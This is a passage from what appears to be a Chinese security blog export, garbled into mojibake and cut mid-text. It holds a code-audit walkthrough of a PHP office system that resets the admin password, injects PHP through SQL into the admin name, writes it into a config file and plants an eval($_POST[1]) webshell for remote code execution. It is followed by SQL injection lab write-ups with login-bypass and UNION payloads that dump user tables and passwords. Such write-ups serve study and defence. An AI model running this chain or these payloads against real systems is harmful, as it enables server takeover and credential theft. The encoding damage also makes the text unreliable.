¼å¼åŒ–è·¯å¾„ $_mæˆ‘ä»¬å¯ä»¥æ§åˆ¶GETä¼ å…¥må‚æ•°æ—¶â€™|â€™å­—ç¬¦ä¸¤è¾¹çš„å­—ç¬¦ä¸²æ¥æ§åˆ¶ï¼Œ$på’ŒROOT_PATHï¼Œ$dåœ¨ä¸Šé¢å­˜åœ¨ä¸€ä¸ªç®€å•çš„å¤„ç†ï¼Œå¦‚æœä¸æ˜¯ä»¥â€™â€˜ç»“å°¾å°±ç»™ä»–åŠ ä¸Šâ€™â€˜ æ€»ç»“èµ·æ¥ï¼Œå‡è®¾æˆ‘ä»¬çš„æ ¹ç›®å½•æ˜¯varwwwhtmlï¼Œä¼ å…¥pwebmaindtaskmfile|api é‚£ä¹ˆ$actpathå°±æ˜¯â€varwwwhtmlwebmaintaskapiâ€ ç´§æ¥ç€ä¸‹é¢çš„$actfileå°±æ˜¯â€varwwwhtmlwebmaintaskapifileAction.phpâ€ å…¶å®actfile1æˆ‘ä»¬å¹¶ä¸èƒ½åšåˆ°çœŸæ­£å®Œå…¨çš„å¯æ§ï¼Œå› ä¸ºå…¶æœ€åçš„æ‹¼æ¥æ˜¯$_m.$_mï¼Œå°±æ„å‘³ç€æœ€ååŒ…å«çš„phpæ–‡ä»¶çš„å‰ç¼€åå¿…é¡»ä¸ä¸Šçº§ç›®å½•ç›¸åŒï¼Œå…·æœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œè¿™é‡Œæˆ‘ä»¬ä¾§é‡è§‚å¯Ÿactfileè¢«åŒ…å«åçš„æ“ä½œ(å®é™…ä¸Šactfile1è¢«åŒ…å«åä¹Ÿç¡®å®å¹¶æ²¡æœ‰è¿›è¡Œæ›´å¤šçš„æ“ä½œäº†)ï¼Œæ¥ä¸‹æ¥çš„åˆ†æå›´ç»•ç€actfileï¼Œ$classnameå˜é‡ç”±$aå’Œâ€ClassActionâ€æ‹¼æ¥èµ·æ¥ï¼Œ$aå¯æ§ã€‚ï¼Œ$actnameå˜é‡ç”±$aå’Œâ€Actionâ€æ‹¼æ¥èµ·æ¥ï¼Œ$aå¯æ§ã€‚å¦‚æœajaxboolä¸ºtrueé‚£ä¹ˆ$actnameç”±$aå’Œâ€Ajaxâ€æ‹¼æ¥ï¼Œ$ajaxboolå¯æ§(å‰æ–‡æåˆ°æ§åˆ¶GETä¼ å‚)ã€‚ç„¶ånewä¸€ä¸ªåä¸º$classnameçš„å€¼çš„ç±»ï¼Œåˆ¤æ–­è¯¥å¯¹è±¡ä¸­æ˜¯å¦å­˜åœ¨åä¸º$actnameçš„æ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±æ‰§è¡Œå¹¶æŠŠç»“æœechoå‡ºæ¥ å¯»æ‰¾æ¼æ´ä¿®æ”¹å¯†ç æ¥ä¸‹æ¥æˆ‘ä»¬çš„å·¥ä½œå°±æ˜¯è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„ç±»ä¸­çš„æ–¹æ³•ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ³¨æ„åˆ°äº†\\webmain\\task\\api\\reimplatAction.phpï¼Œå¦‚ä¸‹ï¼š ?php class reimplatClassAction extends apiAction\tpublic function initAction() $this-display= false; //å¹³å°ä¸Šé€šçŸ¥è¿‡æ¥çš„æ•°æ®\tpublic function indexAction() $body = $this-getpostdata();//ä¸‹é¢ç¯‡å¹…ä¸­æœ‰å…³äºè¯¥æ–¹æ³•çš„å…·ä½“ä»£ç ï¼Œæ— ä»»ä½•è¿‡æ»¤ if(!$body)return; $db = m(reimplat:dept); $key = $db-gethkey();//å¯†é’¥ï¼Œä¸éœ€è¦å…³æ³¨ $bodystr = $this-jm-strunlook($body, $key); if(!$bodystr)return; $data = json_decode($bodystr, true); $msgtype = arrvalue($data,msgtype); $msgevent= arrvalue($data,msgevent); //ç”¨æˆ·çŠ¶æ€æ”¹å˜åœç”¨ if($msgtype==subscribe) $user = arrvalue($data, user); $zt = 0; if($msgevent==yes)$zt = 1; if($msgevent==stop)$zt = 2; $db-update(`status`=.$zt.,`user`=$user); //ä¿®æ”¹æ‰‹æœºå· if($msgtype==editmobile) $user = arrvalue($data, user); $mobile = arrvalue($data, mobile); $where = `user`=$user; $upstr = `mobile`=$mobile; $db-update($upstr, $where); $dbs\t= m(admin); $dbs-update($upstr,$where); $uid = $dbs-getmou(id,$where); m(userinfo)-update($upstr,`id`=$uid); //ä¿®æ”¹å¯†ç  if($msgtype==editpass) $user = arrvalue($data, user); $pass = arrvalue($data, pass); if($pass $user) $where = `user`=$user; $mima = md5($pass); m(admin)-update(`pass`=$mima,`editpass`=`editpass`+1, $where); //æ„Ÿè§‰å¯ä»¥æ“ä½œä¸€ä¸‹ ä¸Šè¿°ä»£ç ä¸­çš„getpostdataå‡½æ•°ï¼š public function getpostdata() $postdata = ; if(isset($GLOBALS[HTTP_RAW_POST_DATA]))$postdata = $GLOBALS[HTTP_RAW_POST_DATA]; if($postdata==)$postdata = trim(file_get_contents(php://input)); //trimæ–¹æ³•å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ return $postdata; å‘ç°å¾ˆæœ‰ç”¨çš„åœ°æ–¹ï¼Œè¯¥å‡½æ•°æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå¹¶ä¸”é€šè¿‡php://inputä¼ªåè®®æ¥è·å–POSTè¿›å»çš„æ•°æ®ï¼Œå¯ä»¥åˆ©ç”¨ä¸€ä¸‹ å¯¹äºstrunlook()æ–¹æ³•ï¼Œæˆ‘ä»¬æº¯æºåå‘ç°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²è§£å¯†çš„å‡½æ•°ï¼Œä½äºincludechajianjmChajian.phpæ–‡ä»¶ä¸­ï¼Œæº¯æºè¿‡ç¨‹å¦‚ä¸‹ï¼š $bodystr = $this-jm-strunlook($body, $key);//æº¯æºthis-jm$this-jm = c(jm, true);//Action.php//ç»§ç»­æº¯æºcæ–¹æ³•function c($name, $inbo=true, $param1=, $param2=)\t$class\t= .$name.Chajian;\t$path\t= .ROOT_PATH./include/chajian/.$class..php;\t$cls\t= NULL;\tif(file_exists($path)) include_once($path); if($inbo)$cls\t= new $class($param1, $param2); return $cls;\t//ä½äºrockFun.php//è¯¥æ–¹æ³•ä¼šåŒ…å«æ–‡ä»¶$nameChajian.phpï¼Œè¿™é‡Œæˆ‘ä»¬è¦æº¯æºåˆ°jmChajian.phpï¼Œæ‰¾åˆ°äº†strunlookæ–¹æ³•ï¼ˆå¯¹æ•°æ®ç®€å•è§£å¯†ï¼‰ åœ¨reimplatAction.phpä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨indexAction()æ–¹æ³•ï¼Œé€šè¿‡å®ƒæ¥ä¿®æ”¹è´¦æˆ·çš„å¯†ç  æ‰€ä»¥ç°åœ¨çš„æ€è·¯ï¼šä¼ å…¥åŠ å¯†åçš„jsonæ•°æ®ï¼Œè®©åå°è¿›è¡Œè‡ªåŠ¨è§£å¯†ï¼Œé€šè¿‡è¾“å…¥ç›¸åº”çš„é”®å€¼å¯¹æ¥ä¿®æ”¹å¯†ç  å› æ­¤jsonæ•°æ®ä¸­æˆ‘ä»¬éœ€è¦çš„é”®å€¼å¯¹å¦‚ä¸‹ï¼š msgtype:editpass,user:admin,pass:admin é¦–å…ˆæˆ‘ä»¬åœ¨æœ¬åœ°æµ‹è¯•çš„æ—¶å€™éœ€è¦åœ¨reimplatAction.phpæ–‡ä»¶ä¸­çš„æ·»åŠ ç›¸å…³ä»£ç ï¼Œä»è€Œè·å–åˆ°åŠ å¯†åçš„jsonæ•°æ®ï¼Œå¦‚ä¸‹ï¼š åˆ©ç”¨bpæŠ“åŒ…ï¼Œç„¶åè¿›è¡Œæ“ä½œï¼šgetä¼ å‚?p=webmaind=taskm=reimplat|apia=indexï¼Œæ¥ç€å†åŠ æˆ‘ä»¬æ‰€éœ€çš„jsonä»£ç ï¼Œå¦‚ä¸‹ï¼š å¾—åˆ°åŠ å¯†åçš„jsonå†…å®¹ï¼Œç»§ç»­æ“ä½œï¼š ç”±äºè¾“å…¥çš„æ˜¯åŠ å¯†åçš„jsonå†…å®¹ï¼Œåå°ä¼šè‡ªåŠ¨è§£ç é…å¯¹ä¿®æ”¹è´¦æˆ·å¯†ç ï¼Œè¿™æ ·å­æˆ‘ä»¬å°±æˆåŠŸä¿®æ”¹äº†adminçš„å¯†ç  é€€å‡ºè´¦å·ï¼Œè¾“å…¥ä¿®æ”¹åçš„å¯†ç ï¼ŒæˆåŠŸç™»å½• å®ç°rceä½†æ˜¯è¿™æ ·å­çš„è¯æˆ‘ä»¬ä»…ä»…èƒ½åšåˆ°çš„ä¹Ÿå°±æ˜¯ä¿®æ”¹ä¿®æ”¹è´¦æˆ·çš„å¯†ç ï¼Œä¸åº”æ»¡è¶³äºæ­¤ï¼Œç»§ç»­æŸ¥çœ‹ä»£ç  åœ¨webmainsystemcogcogAction.phpä¸‹ï¼š cogClassAction::savecongAjax()æ–¹æ³•ä¸­æœ‰ä¸€å¤„æ–‡ä»¶å†™å…¥ï¼Œåªè¦å¯ä»¥æ§åˆ¶$adminnameå°±å¯ä»¥æ§åˆ¶ä»»æ„æ–‡ä»¶å†™å…¥ å¯¹$adminnameè¿›è¡Œæº¯æºï¼Œå‘ç°æ­¤å­—æ®µä¼šä»æ•°æ®åº“ä¸­å–adminçš„nameï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ³¨å…¥ç‚¹ï¼ŒæˆåŠŸæ³¨å…¥ä¾¿å¯ä»¥åˆ©ç”¨ åŸæœ¬æˆ‘ä»¬è¾“å…¥çš„$adminnameä¼šè¢«æ³¨é‡Šæ‰ï¼Œè€Œæˆ‘ä»¬éœ€è¦æ‘†è„±è¢«æ³¨é‡Šæ‰çš„å‘½è¿ï¼Œæ‰€ä»¥è¦åœ¨è¾“å…¥å†…å®¹çš„å¼€å¤´æ¥ä¸Šä¸€ä¸ª/nè¿›è¡Œæ¢è¡Œï¼ŒåŒæ—¶åœ¨æœ«å°¾åŠ ä¸Š//ä½¿å¾—åç»­ä¸æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å…¨è¢«æ³¨é‡Šæ‰ å®è´¨ä¸Šæˆ‘ä»¬è¾“å…¥çš„ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”è¯¥å­—ç¬¦ä¸²ä¼šå†™å…¥ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ŒæˆåŠŸå†™å…¥å›æ˜¾ok å¯¹$_confpathè¿›è¡Œæº¯æºï¼Œå…·ä½“ä»£ç ä¸º$_confpath = $this-rock-strformat(?0/?1/?1Config.php, ROOT_PATH, PROJECT); å‘ç°$thia-adminnameå…¶å®å°±æ˜¯å†™å…¥é…ç½®æ–‡ä»¶webmainConfig.phpä¸­ ç„¶åæˆ‘ä»¬å¯¹reimplatAction.phpæ–‡ä»¶ä¸­çš„mæ–¹æ³•è¿›è¡Œæº¯æºï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š function m($name) $cls = NULL; $pats = $nac = ; $nas = $name; $asq = explode(:, $nas); if(count($asq)1) $nas = $asq[1]; $nac = $asq[0]; $pats = $nac./; $_pats = .ROOT_PATH./.PROJECT./model/.$nac./.$nac..php; if(file_exists($_pats)) include_once($_pats); $class = .$nac.Model; $cls = new $class($nas); $class = .$nas.ClassModel; $path = .ROOT_PATH./.PROJECT./model/.$pats..$nas.Model.php; if(file_exists($path)) include_once($path); if($nac!=)$class= $nac._.$class; $cls = new $class($nas); if($cls==NULL)$cls = new sModel($nas); return $cls; å¯ä»¥å¾—åˆ°è¯¥æ–¹æ³•æ˜¯æŠŠwebmainmodelä¸‹çš„phpæ–‡ä»¶åŒ…å«èµ·æ¥äº† mæ–¹æ³•çš„å‚æ•°æ˜¯$nameï¼Œå®é™…ä¸Šæˆ‘ä»¬æ“ä½œçš„è¡¨åæ˜¯xinhu_$name ç»¼ä¸Šï¼Œæˆ‘é€‰æ‹©çš„æ˜¯reimplatAction.phpæ–‡ä»¶ä¸­çš„ä¿®æ”¹mobileå¤„ï¼Œä»é‚£é‡Œä¸‹æ‰‹è¿›è¡Œsqlæ³¨å…¥ï¼Œè¿™æ ·å­æˆ‘ä»¬å°±éœ€è¦æº¯æºåˆ°åº•å±‚çš„update()æ–¹æ³•ï¼Œæ˜ç™½å…¶å…·ä½“çš„sqlè¯­å¥ï¼Œä»è€Œè¿›è¡Œç»•è¿‡ æœ€åº•å±‚çš„updateæ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š public function update($table,$content,$where) $where = $this-getwhere($where); $sql=update `$table` set $content where $where ; return $this-tranbegin($sql); åœ¨æ–‡ä»¶ä¸­çš„å·²ç»æŒ‡å®šäº†$tableçš„å†…å®¹ï¼Œå³adminå’Œå…¶ä»–ä¸¤ä¸ªè¡¨ï¼Œ$whereçš„å†…å®¹ä¸º=user=$userï¼Œ$contentåœ¨å…·ä½“ä»£ç ä¸­å³$upstr,å³= mobile=$mobile;ï¼Œå› æ­¤æˆ‘ä»¬ä¼ å…¥çš„jsonæ•°æ®éœ€ä¸ºä»¥ä¸‹æ ¼å¼ï¼š msgtype:editmobile,user:,mobile: åœ¨sqlæ–‡ä»¶ä¸­çœ‹åˆ°xinhu_adminè¡¨ä¸­çš„mobileå­—æ®µå¤„æ˜¯è¾“å…¥å­—ç¬¦ä¸²ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€ƒå‡ºå•å¼•å·åŒ…è£¹ å¹¶ä¸”æˆ‘ä»¬è¦æ”¹çš„å­—æ®µåä¸ºnameï¼Œä¹Ÿæ˜¯éœ€è¦è¾“å…¥å­—ç¬¦ä¸²çš„ æœ€ç»ˆæˆ‘ä»¬éœ€è¦ä¼ å…¥çš„jsonæ•°æ®å¦‚ä¸‹ï¼š msgtype:editmobile,user:admin,mobile:123,name= phpinfo();// ç„¶åå†æŠŠåŠ å¯†åçš„jsonæ–‡ä»¶å†ä¼ ä¸€éï¼ŒæŸ¥çœ‹xinhu_adminè¡¨ï¼Œå¯ä»¥çœ‹è§adminçš„nameå·²ç»å‘ç”Ÿäº†æ”¹å˜ æ¥ç€æˆ‘ä»¬æŸ¥çœ‹é…ç½®æ–‡ä»¶ï¼Œå‘ç°å¹¶æ²¡æœ‰ä»»ä½•ä¿®æ”¹ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆ è¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰è°ƒç”¨$adminnameæ‰€å±çš„savecongAjax()æ–¹æ³•ï¼Œå˜é‡è¿˜æ²¡æœ‰è¢«å†™å…¥é…ç½®æ–‡ä»¶ä¸­ æ‰€ä»¥æˆ‘ä»¬åœ¨é‡æ–°ç™»é™†åéœ€è¦åŒ…å«çš„å†…å®¹å¦‚ä¸‹ï¼š ?p=webmaind=systemm=cog|cogajaxbool=truea=savecong æˆåŠŸåŒ…å« å†åˆ·æ–°ä¸€éé¡µé¢ï¼Œå¦‚ä¸‹ï¼š æˆåŠŸå®ç°äº†phpinfo()ï¼Œè¿™ä¹Ÿè¯´æ˜äº†æˆ‘ä»¬å¯ä»¥å®ç°rceäº†ï¼Œä½†æ˜¯è¦æ³¨æ„nameå­—æ®µæœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥ä¸€å¥è¯æœ¨é©¬ä¸èƒ½å¤Ÿå¤ªé•¿ æ¥ç€å®ç°rceï¼Œæ›´æ”¹jsonæ–‡ä»¶å¦‚ä¸‹ï¼š msgtype:editmobile,user:admin,mobile:123,name= eval($_POST[1]);// å‰©ä¸‹çš„æ“ä½œå’Œä¸Šé¢å®ç°phpinfo()çš„æ“ä½œä¸€æ¨¡ä¸€æ ·ï¼Œç„¶åæˆ‘ä»¬å°è¯•ç”¨èšå‰‘è¿æ¥ æˆåŠŸè¿æ¥ä¸Šï¼Œå®ç°rce","categories":["ä»£ç å®¡è®¡"]},{"title":"Bp-sql","path":"/2024/07/07/Bp-sql/","content":"SQLæ³¨å…¥å¤‡å¿˜å• Labï¼šWHERE å­å¥ä¸­çš„ SQL æ³¨å…¥æ¼æ´å…è®¸æ£€ç´¢éšè—æ•°æ®æ­¤å®éªŒå®¤åœ¨äº§å“ç±»åˆ«è¿‡æ»¤å™¨ä¸­åŒ…å« SQL æ³¨å…¥æ¼æ´ã€‚å½“ç”¨æˆ·é€‰æ‹©ä¸€ä¸ªç±»åˆ«æ—¶ï¼Œåº”ç”¨ç¨‹åºå°†æ‰§è¡Œå¦‚ä¸‹ SQL æŸ¥è¯¢ï¼š SELECT * FROM products WHERE category = Gifts AND released = 1 è¦å®Œæˆè¯¥å®éªŒï¼Œè¯·æ‰§è¡Œ SQL æ³¨å…¥æ”»å‡»ï¼Œå¯¼è‡´åº”ç”¨ç¨‹åºæ˜¾ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªæœªå‘å¸ƒçš„äº§å“ã€‚ å½“æˆ‘ä»¬è¿›å…¥ç¯å¢ƒä¹‹åï¼Œé€‰æ‹©å…¶ä¸­ä¸€ä¸ªç±»åˆ«åï¼Œä¼šè‡ªåŠ¨ç»™æˆ‘ä»¬è¿›è¡Œç­›é€‰ç„¶åä»…æ˜¾ç¤ºå‡ºæˆ‘ä»¬é€‰æ‹©çš„ç±»åˆ«ä¸­æˆ‘ä»¬æ‰€èƒ½çœ‹åˆ°çš„ä¸œè¥¿ æŸ¥è¯¢çš„sqlè¯­å¥å¦‚ä¸Šæ‰€ç¤º å› æ­¤æˆ‘ä»¬è¾“å…¥çš„payloadä¸ºï¼š/filter?category=Gifts or 1=1--+ Labï¼šå…è®¸ç»•è¿‡ç™»å½•çš„ SQL æ³¨å…¥æ¼æ´æœ¬å®éªŒçš„ç™»å½•å‡½æ•°ä¸­å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚è¦å®Œæˆè¯¥å®éªŒï¼Œè¯·æ‰§è¡Œ SQL æ³¨å…¥æ”»å‡»ï¼Œä»¥ administrator ç”¨æˆ·èº«ä»½ç™»å½•åˆ°åº”ç”¨ç¨‹åºã€‚ è¿›å…¥ç¯å¢ƒçš„ç™»é™†ç•Œé¢ï¼Œéšä¾¿è¾“å…¥ç”¨æˆ·åå’Œå¯†ç å¹¶æŠ“åŒ…ï¼Œå¦‚ä¸‹ï¼š ä»é¢˜ç›®ä¸­æˆ‘ä»¬å·²çŸ¥ç®¡ç†å‘˜çš„è´¦æˆ·åï¼Œä½†æ˜¯ä¸çŸ¥é“å¯†ç  å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨è¾“å…¥è´¦å·åçš„åœ°æ–¹å°†å‰©ä¸‹çš„sqlè¯­å¥å…¨éƒ¨æ³¨é‡Šæ‰ï¼Œè¿™æ ·å°±ä¸ä¼šéªŒè¯åˆ°å¯†ç ï¼Œå¯†ç å¯ä»¥éšä¾¿å¡« è¾“å…¥è´¦å·ï¼šadministrator#ï¼Œè¢«æ‹¦æˆª æ¢ä¸€ä¸ªæ³¨é‡Šç¬¦ï¼šadministrator--+ï¼ŒæˆåŠŸ Labï¼šSQLæ³¨å…¥æ”»å‡»ï¼ŒæŸ¥è¯¢Oracleä¸Šçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬æ­¤å®éªŒå®¤åœ¨äº§å“ç±»åˆ«è¿‡æ»¤å™¨ä¸­åŒ…å« SQL æ³¨å…¥æ¼æ´ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ UNION æ”»å‡»æ¥æ£€ç´¢æ³¨å…¥æŸ¥è¯¢çš„ç»“æœã€‚è¦è§£å†³è¯¥å®éªŒï¼Œè¯·æ˜¾ç¤ºæ•°æ®åº“ç‰ˆæœ¬å­—ç¬¦ä¸² Oracle ä¸Šæœ‰ä¸€ä¸ªåä¸º dual çš„å†…ç½®è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥è¡¨æ¥å®ç°ç›®çš„ é¦–å…ˆæˆ‘ä»¬æµ‹è¯•å‡ºä¸ºå•å¼•å·åŒ…è£¹ å†é€šè¿‡ï¼š/filter?category=Clothing%2c+shoes+and+accessories orderby 2--+åˆ¤æ–­å‡ºå›æ˜¾ä¸¤ä¸ªå­—æ®µ ç»§ç»­ï¼š/filter?category=Clothing%2c+shoes+and+accessories union select abc,def from dual--+(Oracleé»˜è®¤æ˜¯å­—ç¬¦ä¸²) æŸ¥è¯¢èµ„æ–™å¾—çŸ¥è¦æŸ¥çœ‹Oracleçš„ç‰ˆæœ¬å·çš„è¯­å¥ä¸ºï¼šselect banner from v$version ç”±äºè¦å›æ˜¾ä¸¤ä¸ªå­—æ®µï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªå­—æ®µè®¾ä¸ºnull å› æ­¤å®Œæ•´çš„æ³¨å…¥è¯­å¥ä¸ºï¼š/filter?category=Clothing%2c+shoes+and+accessories union select banner,null from v$version--+ æˆåŠŸå›æ˜¾å‡ºç‰ˆæœ¬å·ï¼Œé¢˜ç›®è§£å†³ Labï¼šSQLæ³¨å…¥æ”»å‡»ï¼ŒæŸ¥è¯¢MySQLå’ŒMicrosoftçš„æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬æ­¤å®éªŒå®¤åœ¨äº§å“ç±»åˆ«è¿‡æ»¤å™¨ä¸­åŒ…å« SQL æ³¨å…¥æ¼æ´ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ UNION æ”»å‡»æ¥æ£€ç´¢æ³¨å…¥æŸ¥è¯¢çš„ç»“æœã€‚ è¦è§£å†³è¯¥å®éªŒï¼Œè¯·æ˜¾ç¤ºæ•°æ®åº“ç‰ˆæœ¬å­—ç¬¦ä¸²ã€‚ æµ‹è¯•ä¸€ä¸‹ä¸ºå•å¼•å·åŒ…è£¹ï¼Œå›æ˜¾ä¸¤ä¸ªå­—æ®µ æ‰€ä»¥æ³¨å…¥ï¼š/filter?category=Gifts union select @@version,null--+ é¡µé¢æœ«å°¾å›æ˜¾ç‰ˆæœ¬å·ï¼Œé¢˜ç›®è§£å†³ Labï¼šSQLæ³¨å…¥æ”»å‡»ï¼Œåˆ—å‡ºéOracleæ•°æ®åº“ä¸Šçš„æ•°æ®åº“å†…å®¹æ­¤å®éªŒå®¤åœ¨äº§å“ç±»åˆ«è¿‡æ»¤å™¨ä¸­åŒ…å« SQL æ³¨å…¥æ¼æ´ã€‚æŸ¥è¯¢çš„ç»“æœå°†åœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›ï¼Œå› æ­¤æ‚¨å¯ä»¥ä½¿ç”¨ UNION æ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚è¯¥åº”ç”¨ç¨‹åºå…·æœ‰ç™»å½•åŠŸèƒ½ï¼Œæ•°æ®åº“åŒ…å«ä¸€ä¸ªä¿å­˜ç”¨æˆ·åå’Œå¯†ç çš„è¡¨ã€‚æ‚¨éœ€è¦ç¡®å®šè¯¥è¡¨çš„åç§°åŠå…¶åŒ…å«çš„åˆ—ï¼Œç„¶åæ£€ç´¢è¯¥è¡¨çš„å†…å®¹ä»¥è·å¾—æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ã€‚è¦å®Œæˆå®éªŒï¼Œè¯·ä»¥ administrator ç”¨æˆ·èº«ä»½ç™»å½•ã€‚ é¦–å…ˆæ‹¦æˆªå¹¶ä¿®æ”¹è®¾ç½®äº§å“ç±»åˆ«è¿‡æ»¤å™¨çš„è¯·æ±‚ æµ‹è¯•å‡ºå•å¼•å·åŒ…è£¹ï¼Œå›æ˜¾ä¸¤ä¸ªå­—æ®µï¼Œunionæ³¨å…¥å¯åŠ¨ è¦æ³¨æ„Oracleæ•°æ®åº“å’Œmysqlæ•°æ®åº“è¿˜æ˜¯æœ‰ç‚¹ä¸ä¸€æ ·çš„ é¦–å…ˆæµ‹å‡ºæ‰€æœ‰çš„è¡¨ï¼š?category=Giftsunion select table_name,null from information_schema.tables--+ ç„¶åæ£€ç´¢ä¸€ä¸‹å‘ç°æˆ‘ä»¬æ‰€éœ€çš„è¡¨åä¸ºusers_accvfs æ¥ç€æµ‹å‡ºè¯¥è¡¨çš„æ‰€æœ‰å­—æ®µï¼š?category=Giftsunion select column_name,null from information_schema.columns where table_name=users_accvfs--+ å¾—åˆ°æˆ‘ä»¬æ‰€éœ€çš„ä¸¤ä¸ªå­—æ®µåï¼Œçˆ†å‡ºå…¶å†…å®¹ï¼š?category=Giftsunion select username_tvjrcf,password_lyiaeg from users_accvfs--+ å¾—åˆ°ç®¡ç†å‘˜çš„å¯†ç  ç™»å½•è´¦å·ï¼Œé¢˜ç›®è§£å†³ Labï¼šSQLæ³¨å…¥æ”»å‡»ï¼Œåˆ—å‡ºOracleä¸Šçš„æ•°æ®åº“å†…å®¹æ­¤å®éªŒå®¤åœ¨äº§å“ç±»åˆ«è¿‡æ»¤å™¨ä¸­åŒ…å« SQL æ³¨å…¥æ¼æ´ã€‚æŸ¥è¯¢çš„ç»“æœå°†åœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›ï¼Œå› æ­¤æ‚¨å¯ä»¥ä½¿ç”¨ UNION æ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚ è¯¥åº”ç”¨ç¨‹åºå…·æœ‰ç™»å½•åŠŸèƒ½ï¼Œæ•°æ®åº“åŒ…å«ä¸€ä¸ªä¿å­˜ç”¨æˆ·åå’Œå¯†ç çš„è¡¨ã€‚æ‚¨éœ€è¦ç¡®å®šè¯¥è¡¨çš„åç§°åŠå…¶åŒ…å«çš„åˆ—ï¼Œç„¶åæ£€ç´¢è¯¥è¡¨çš„å†…å®¹ä»¥è·å¾—æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ã€‚è¦å®Œæˆå®éªŒï¼Œè¯·ä»¥ administrator ç”¨æˆ·èº«ä»½ç™»å½• è¦æ³¨æ„ï¼šåœ¨ Oracle æ•°æ®åº“ä¸Šï¼Œæ¯ä¸ª SELECT è¯­å¥å¿…é¡»æŒ‡å®šä¸€ä¸ªè¡¨æ¥é€‰æ‹© FROM ã€‚å¦‚æœæ‚¨çš„ UNION SELECT æ”»å‡»ä¸ä»è¡¨ä¸­æŸ¥è¯¢ï¼Œæ‚¨ä»ç„¶éœ€è¦åŒ…å« FROM å…³é”®å­—ï¼Œåè·Ÿæœ‰æ•ˆçš„è¡¨åç§°ï¼›Oracleæ•°æ®åº“ä¸­æœ‰ä¸€ä¸ªå†…ç½®è¡¨dual ç”±äºæ˜¯æŸ¥çœ‹Oracleæ•°æ®åº“ä¸­çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦éµå¾ªå…¶è¯­æ³•è§„èŒƒ é¦–å…ˆè·å–åˆ°æ‰€æœ‰çš„è¡¨ï¼š?category=Giftsunion select table_name,null from all_tables--+ å¾—åˆ°æˆ‘ä»¬æ‰€éœ€çš„è¡¨åçˆ†å‡ºæ‰€æœ‰çš„å­—æ®µï¼š?category=Giftsunion select column_name,null from all_tab_columns where table_name=USERS_FSFWLB--+ è·å–åˆ°äº†ä¸¤ä¸ªæˆ‘ä»¬éœ€è¦çš„å­—æ®µåï¼Œæ¥ç€çˆ†å‡ºå…¶å†…å®¹ï¼š?category=Giftsunion select USERNAME_MIGUZK,PASSWORD_OAVFCV from USERS_FSFWLB--+ è·å–åˆ°ç®¡ç†å‘˜çš„å¯†ç  ç™»å½•ä¸Šå»ï¼Œé¢˜ç›®è§£å†³ Labï¼šSQLæ³¨å…¥UNIONæ”»å‡»ï¼Œç¡®å®šæŸ¥è¯¢è¿”å›çš„åˆ—æ•°æ­¤å®éªŒå®¤åœ¨äº§å“ç±»åˆ«è¿‡æ»¤å™¨ä¸­åŒ…å« SQL æ³¨å…¥æ¼æ´ã€‚æŸ¥è¯¢çš„ç»“æœå°†åœ¨åº”ç”¨ç¨‹åºçš„å“åº”ä¸­è¿”å›ï¼Œå› æ­¤æ‚¨å¯ä»¥ä½¿ç”¨ UNION æ”»å‡»ä»å…¶ä»–è¡¨ä¸­æ£€ç´¢æ•°æ®ã€‚æ­¤ç±»æ”»å‡»çš„ç¬¬ä¸€æ­¥æ˜¯ç¡®å®šæŸ¥è¯¢è¿”å›çš„åˆ—æ•°ã€‚ç„¶åï¼Œæ‚¨å°†åœ¨åç»­å®éªŒä¸­ä½¿ç”¨æ­¤æŠ€æœ¯æ¥æ„å»ºå®Œæ•´çš„æ”»å‡»ã€‚è¦å®Œæˆè¯¥å®éªŒï¼Œè¯·é€šè¿‡æ‰§è¡Œ SQL æ³¨å…¥ UNION æ”»å‡»ï¼ˆè¿”å›åŒ…å«ç©ºå€¼çš„é™„åŠ è¡Œï¼‰æ¥ç¡®å®šæŸ¥è¯¢è¿”å›çš„åˆ—æ•°ã€‚ å°±æ˜¯ç¡®å®šå›æ˜¾çš„åˆ—æ•°è€Œå·² è¦æ³¨æ„çš„æ˜¯åé¢æ˜¯è¦ï¼šunion select null,null,null--+ï¼Œéœ€è¦çš„æ˜¯null Labï¼šSQL æ³¨å…¥ UNION æ”»å‡»ï¼ŒæŸ¥æ‰¾åŒ…å«æ–‡æœ¬çš„åˆ—æ­¤å®éªŒå®¤åœ¨äº§å“ç±»åˆ«è¿‡æ»¤å™¨ä¸­åŒ…å« SQL 